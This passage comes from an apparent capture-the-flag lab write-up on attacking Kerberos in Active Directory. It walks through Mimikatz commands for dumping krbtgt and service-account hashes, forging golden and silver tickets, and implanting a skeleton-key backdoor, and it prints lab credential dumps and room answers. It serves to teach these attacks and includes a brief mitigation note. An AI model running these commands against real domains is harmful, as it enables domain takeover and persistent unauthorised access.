09/15/2018  12:19 AM    <DIR>          Registration
09/15/2018  12:19 AM    <DIR>          RemotePackages
09/15/2018  12:19 AM    <DIR>          rescache
09/15/2018  12:19 AM    <DIR>          Resources
09/15/2018  12:19 AM    <DIR>          SchCache
09/15/2018  12:19 AM    <DIR>          schemas
05/25/2020  03:06 PM    <DIR>          security
09/15/2018  12:13 AM            30,931 ServerStandard.xml
09/15/2018  12:13 AM            30,914 ServerStandardEval.xml
05/25/2020  12:17 PM    <DIR>          ServiceProfiles
09/15/2018  12:19 AM    <DIR>          ServiceState
04/30/2026  01:47 AM    <DIR>          servicing
09/15/2018  12:21 AM    <DIR>          Setup
09/06/2019  05:31 PM    <DIR>          ShellComponents
09/06/2019  05:31 PM    <DIR>          ShellExperiences
09/15/2018  12:19 AM    <DIR>          SKB
05/25/2020  12:22 PM    <DIR>          SoftwareDistribution
09/15/2018  12:19 AM    <DIR>          Speech
09/15/2018  12:19 AM    <DIR>          Speech_OneCore
09/06/2019  05:28 PM           132,608 splwow64.exe
09/15/2018  12:19 AM    <DIR>          System
09/15/2018  12:16 AM               219 system.ini
04/30/2026  02:27 AM    <DIR>          System32
09/15/2018  12:19 AM    <DIR>          SystemApps
09/15/2018  12:19 AM    <DIR>          SystemResources
05/25/2020  03:05 PM    <DIR>          SYSVOL
05/25/2020  03:21 PM    <DIR>          SysWOW64
09/15/2018  12:19 AM    <DIR>          TAPI
05/25/2020  12:17 PM    <DIR>          Tasks
04/30/2026  03:52 AM    <DIR>          Temp
09/06/2019  05:31 PM    <DIR>          TextInput
09/15/2018  12:19 AM    <DIR>          tracing
09/15/2018  12:19 AM    <DIR>          twain_32
09/15/2018  12:13 AM            64,512 twain_32.dll
09/15/2018  12:19 AM    <DIR>          Vss
09/15/2018  12:19 AM    <DIR>          WaaS
09/15/2018  12:19 AM    <DIR>          Web
09/15/2018  12:16 AM                92 win.ini
04/30/2026  01:46 AM               276 WindowsUpdate.log
09/15/2018  12:13 AM            11,776 winhlp32.exe
01/03/2021  08:37 AM    <DIR>          WinSxS
09/15/2018  12:12 AM           316,640 WMSysPr9.prx
09/15/2018  12:12 AM            11,264 write.exe
              23 File(s)      7,108,727 bytes
              75 Dir(s)  50,918,486,016 bytes free

C:\Users\Administrator>
```

Note that this is only a POC to understand how to pass the ticket and gain domain admin the way that you approach passing the ticket may be different based on what kind of engagement you're in so do not take this as a definitive guide of how to run this attack.

#### Pass the Ticket Mitigation

Let's talk blue team and how to mitigate these types of attacks.

- Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.

---------------------------------------------------------------------------

### Task 7: Golden/Silver Ticket Attacks w/ Mimikatz

Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however well be using mimikatz in order to create a silver ticket.

A silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet. If stealth and staying undetected matter then a silver ticket is probably a better option than a golden ticket however the approach to creating one is the exact same. The key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.

A specific use scenario for a silver ticket would be that you want to access the domain's SQL server however your current compromised user does not have access to that server. You can find an accessible service account to get a foothold with by kerberoasting that service, you can then dump the service hash and then impersonate their TGT in order to request a service ticket for the SQL service from the KDC allowing you access to the domain's SQL server.

#### KRBTGT Overview

In order to fully understand how these attacks work you need to understand what the difference between a KRBTGT and a TGT is. A KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket from the KRBTGT you give yourself the ability to create a service ticket for anything you want. A TGT is a ticket to a service account issued by the KDC and can only access that service the TGT is from like the SQLService ticket.

#### Golden/Silver Ticket Attack Overview

A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.

![Golden Ticket](Images/Golden_Ticket.png)

#### Dump the krbtgt hash

1. `cd downloads && mimikatz.exe` - navigate to the directory mimikatz is in and run mimikatz

2. `privilege::debug` - ensure this outputs [privilege '20' ok]

3. `lsadump::lsa /inject /name:krbtgt` - This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.

![Mimikatz Dump Krbtgt](Images/Mimikatz_Dump_Krbtgt.png)

```bat
C:\Users\Administrator\Downloads>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::lsa /inject /name:krbtgt
Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : 72cd714611b64cd4d5550cd2759db3f6
    LM   :
  Hash NTLM: 72cd714611b64cd4d5550cd2759db3f6
    ntlm- 0: 72cd714611b64cd4d5550cd2759db3f6
    lm  - 0: aec7e106ddd23b3928f7b530f60df4b6

 * WDigest
    01  d2e9aa3caa4509c3f11521c70539e4ad
    02  c9a868fc195308b03d72daa4a5a4ee47
    03  171e066e448391c934d0681986f09ff4
    04  d2e9aa3caa4509c3f11521c70539e4ad
    05  c9a868fc195308b03d72daa4a5a4ee47
    06  41903264777c4392345816b7ecbf0885
    07  d2e9aa3caa4509c3f11521c70539e4ad
    08  9a01474aa116953e6db452bb5cd7dc49
    09  a8e9a6a41c9a6bf658094206b51a4ead
    10  8720ff9de506f647ad30f6967b8fe61e
    11  841061e45fdc428e3f10f69ec46a9c6d
    12  a8e9a6a41c9a6bf658094206b51a4ead
    13  89d0db1c4f5d63ef4bacca5369f79a55
    14  841061e45fdc428e3f10f69ec46a9c6d
    15  a02ffdef87fc2a3969554c3f5465042a
    16  4ce3ef8eb619a101919eee6cc0f22060
    17  a7c3387ac2f0d6c6a37ee34aecf8e47e
    18  085f371533fc3860fdbf0c44148ae730
    19  265525114c2c3581340ddb00e018683b
    20  f5708f35889eee51a5fa0fb4ef337a9b
    21  bffaf3c4eba18fd4c845965b64fca8e2
    22  bffaf3c4eba18fd4c845965b64fca8e2
    23  3c10f0ae74f162c4b81bf2a463a344aa
    24  96141c5119871bfb2a29c7ea7f0facef
    25  f9e06fa832311bd00a07323980819074
    26  99d1dd6629056af22d1aea639398825b
    27  919f61b2c84eb1ff8d49ddc7871ab9e0
    28  d5c266414ac9496e0e66ddcac2cbcc3b
    29  aae5e850f950ef83a371abda478e05db

 * Kerberos
    Default Salt : CONTROLLER.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 79bf07137a8a6b8f

 * Kerberos-Newer-Keys
    Default Salt : CONTROLLER.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : dfb518984a8965ca7504d6d5fb1cbab56d444c58ddff6c193b64fe6b6acf1033
      aes128_hmac       (4096) : 88cc87377b02a885b84fe7050f336d9b
      des_cbc_md5       (4096) : 79bf07137a8a6b8f

 * NTLM-Strong-NTOWF
    Random Value : 4b9102d709aada4d56a27b6c3cd14223

mimikatz #
```

#### Create a Golden/Silver Ticket

1. `Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:` - This is the command for creating a golden ticket. To create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.

I'll show you a demo of creating a golden ticket it is up to you to create a silver ticket.

![Mimikatz Golden Ticket](Images/Mimikatz_Golden_Ticket.png)

#### Use the Golden/Silver Ticket to access other machines

1. `misc::cmd` - this will open a new elevated command prompt with the given ticket in mimikatz.

2. Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.

![Mimikatz Accessing Share](Images/Mimikatz_Accessing_Share.png)

This attack will not work without other machines on the domain however I challenge you to configure this on your own network and try out these attacks.

---------------------------------------------------------------------------

#### What is the SQLService NTLM Hash?

```bat
mimikatz # lsadump::lsa /inject /name:SQLService
Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860

RID  : 00000455 (1109)
User : SQLService

 * Primary
    NTLM : cd40c9ed96265531b21fc5b1dafcfb0a
    LM   :
  Hash NTLM: cd40c9ed96265531b21fc5b1dafcfb0a
    ntlm- 0: cd40c9ed96265531b21fc5b1dafcfb0a
    lm  - 0: 7bb53f77cde2f49c17190f7a071bd3a0

 * WDigest
    01  ba42b3f2ef362e231faca14b6dea61ef
    02  00a0374f4ac4bce4adda196e458dd8b8
    03  f39d8d3e34a4e2eac8f6d4b62fe52d06
    04  ba42b3f2ef362e231faca14b6dea61ef
    05  98c65218e4b7b8166943191cd8c35c23
    06  6eccb56cda1444e3909322305ed04b37
    07  25b7998ce2e7b826a576a43f89702921
    08  8609a1da5628a4016d32f9eb73314fa0
    09  277f84c6c59728fb963a6ee1a3b27f0d
    10  63a9f69e8b36c3e0612ec8784b9c7599
    11  47cb5c436807396994f1b9ccc8d2f8e1
    12  46f2c402d8731ed6dca07f5dbc71a604
    13  2990e284070a014e54c749a6f96f9be7
    14  c059f85b7f01744dc0a2a013978a965f
    15  3600c835f3e81858a77e74370e047e29
    16  bd9c013f8a3f743f8a5b553e8a275a88
    17  c1d94e24d26fdaad4d6db039058c292e
    18  1a433c0634b50c567bac222be4eac871
    19  78d7a7573e4af2b8649b0280cd75636d
    20  136ddfa7840610480a76777f3be007e0
    21  7a4a266a64910bb3e5651994ba6d7fb4
    22  a75ec46a7a473e90da499c599bc3d3cb
    23  8d3db50354c0744094334562adf74c2a
    24  7d07406132d671f73a139ff89da5d72e
    25  dd1e02d5c5b8ae969d903a0bc63d9191
    26  27da7fc766901eac79eba1a970ceb7da
    27  09333600bcc68ee149f449321a5efb27
    28  1c550f8b3af2eb4efda5c34aa8a1c549
    29  3cd9326a300d2261451d1504832cb062

 * Kerberos
    Default Salt : CONTROLLER.LOCALSQLService
    Credentials
      des_cbc_md5       : 5d5dae0dc10e7aec

 * Kerberos-Newer-Keys
    Default Salt : CONTROLLER.LOCALSQLService
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : a3a6dbd4d6fa895b600c28bfdaf6b52d59d46a6eb1f455bc08a19b7e8cdab76d
      aes128_hmac       (4096) : 629b46af543142f77cabcf14afb1caea
      des_cbc_md5       (4096) : 5d5dae0dc10e7aec

 * NTLM-Strong-NTOWF
    Random Value : 7e9547ab69f52e42450903ebbe6ad6ec

mimikatz #
```

Answer: `cd40c9ed96265531b21fc5b1dafcfb0a`

#### What is the Administrator NTLM Hash?

```bat
mimikatz # lsadump::lsa /inject /name:Administrator
Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860

RID  : 000001f4 (500)
User : Administrator

 * Primary
    NTLM : 2777b7fec870e04dda00cd7260f7bee6
    LM   :
  Hash NTLM: 2777b7fec870e04dda00cd7260f7bee6

 * Kerberos
    Default Salt : WIN-G83IJFV2N03Administrator
    Credentials
      des_cbc_md5       : 918abaf7dcb02ce6

 * Kerberos-Newer-Keys
    Default Salt : WIN-G83IJFV2N03Administrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 42b3c13c8c0fef3175eb2b5926f805f919123efd001a9c5a16ee9a86101e32b4
      aes128_hmac       (4096) : d01d6ccf97a2ee214ec7185173a3b659
      des_cbc_md5       (4096) : 918abaf7dcb02ce6

 * NTLM-Strong-NTOWF
    Random Value : 7bfd4ae86442827fb0db294d5c9855ce

mimikatz #
```

Answer: `2777b7fec870e04dda00cd7260f7bee6`

---------------------------------------------------------------------------

### Task 8: Kerberos Backdoors w/ Mimikatz

Along with maintaining access using golden and silver tickets mimikatz has one other trick up its sleeves when it comes to attacking Kerberos. Unlike the golden and silver ticket attacks a Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password.

The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption.

The default hash for a mimikatz skeleton key is *60BA4FCADC466C7A033C178194C03DF6* which makes the password -"mimikatz"

This will only be an overview section and will not require you to do anything on the machine however I encourage you to continue yourself and add other machines and test using skeleton keys with mimikatz.

#### Skeleton Key Overview

The skeleton key works by abusing the AS-REQ encrypted timestamps as I said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.

![Skeleton Key](Images/Skeleton_Key.png)

#### Preparing Mimikatz

1. `cd Downloads && mimikatz.exe` - Navigate to the directory mimikatz is in and run mimikatz

2. `privilege::debug` - This should be a standard for running mimikatz as mimikatz needs local administrator access

![Mimikatz Skeleton Key 1](Images/Mimikatz_Skeleton_Key_1.png)

#### Installing the Skeleton Key w/ mimikatz

1. `misc::skeleton` - Yes! that's it but don't underestimate this small command it is very powerful

![Mimikatz Skeleton Key 2](Images/Mimikatz_Skeleton_Key_2.png)

#### Accessing the forest

The default credentials will be: "mimikatz"

example: `net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz` - The share will now be accessible without the need for the Administrators password

example: `dir \\Desktop-1\c$ /user:Machine1 mimikatz` - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1

The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques however that is out of scope for this room.

---------------------------------------------------------------------------

### Task 9: Conclusion

We've gone through everything from the initial enumeration of Kerberos, dumping tickets, pass the ticket attacks, kerberoasting, AS-REP roasting, implanting skeleton keys, and golden/silver tickets. I encourage you to go out and do some more research on these different types of attacks and really find what makes them tick and find the multitude of different tools and frameworks out there designed for attacking Kerberos as well as active directory as a whole.

You should now have the basic knowledge to go into an engagement and be able to use Kerberos as an attack vector for both exploitations as well as privilege escalation.

Know that you have the knowledge needed to attack Kerberos I encourage you to configure your own active directory lab on your network and try out these attacks on your own to really get an understanding of how these attacks work.

#### Resources

- [https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a](https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [https://specterops.io/blog/2019/02/20/kerberoasting-revisited/](https://specterops.io/blog/2019/02/20/kerberoasting-revisited/)
- [https://blog.harmj0y.net/redteaming/not-a-security-boundary-breaking-forest-trusts/](https://blog.harmj0y.net/redteaming/not-a-security-boundary-breaking-forest-trusts/)
- [https://www.varonis.com/blog/kerberos-authentication-explained/](https://www.varonis.com/blog/kerberos-authentication-explained/)
- [https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf)
- [https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf](https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf)

---------------------------------------------------------------------------

For additional information, please see the references below.

## References

- [Hashcat - Homepage](https://hashcat.net/hashcat/)
- [Hashcat - Kali Tools](https://www.kali.org/tools/hashcat/)
- [Hashcat - Wiki](https://hashcat.net/wiki/)
- [Impacket - GitHub](https://github.com/fortra/impacket)
- [Impacket - Homepage](https://www.coresecurity.com/core-labs/impacket)
- [Impacket - Kali Tools](https://www.kali.org/tools/impacket/)
- [Impacket-scripts - Kali Tools](https://www.kali.org/tools/impacket-scripts/)
- [John the Ripper - Homepage](https://www.openwall.com/john/)
- [john - Kali Tools](https://www.kali.org/tools/john/)
- [Kerberos (protocol) - Wikipedia](https://en.wikipedia.org/wiki/Kerberos_(protocol))
- [Kerbrute - GitHub](https://github.com/ropnop/kerbrute)
- [klist - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/klist)
- [Mimikatz - GitHub](https://github.com/gentilkiwi/mimikatz)
- [Mimikatz - Wiki](https://github.com/gentilkiwi/mimikatz/wiki)
- [NTLM - Wikipedia](https://en.wikipedia.org/wiki/NTLM)
- [Rubeus - GitHub](https://github.com/GhostPack/Rubeus)
- [Rubeus - Kali Tools](https://www.kali.org/tools/rubeus/)
- [wget - Linux manual page](https://man7.org/linux/man-pages/man1/wget.1.html)
- [xfreerdp - Kali Tools](https://www.kali.org/tools/freerdp3/#xfreerdp)
- [xfreerdp - Linux manual page](https://linux.die.net/man/1/xfreerdp)
